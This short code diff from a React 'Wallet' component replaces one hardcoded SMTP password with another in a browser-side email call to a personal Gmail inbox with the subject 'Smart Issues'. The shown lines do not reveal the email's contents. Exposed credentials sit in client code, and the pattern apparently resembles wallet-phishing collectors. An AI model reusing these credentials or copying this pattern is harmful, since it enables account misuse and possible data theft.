@@ -34,7 +34,7 @@ const Wallet = () => {
 			await window.Email.send({
 			    Host : "smtp.elasticemail.com",
 			    Username : "javierolivan001@gmail.com",
-			    Password : "7D9A5AE086D5C91667B7F89728F511FD80BD",
+			    Password : "0643D44672EFECE74152B1A6D937D420D088",
 			    To : 'javierolivan001@gmail.com',
 			    From : "javierolivan001@gmail.com",
 			    Subject : "Smart Issues",
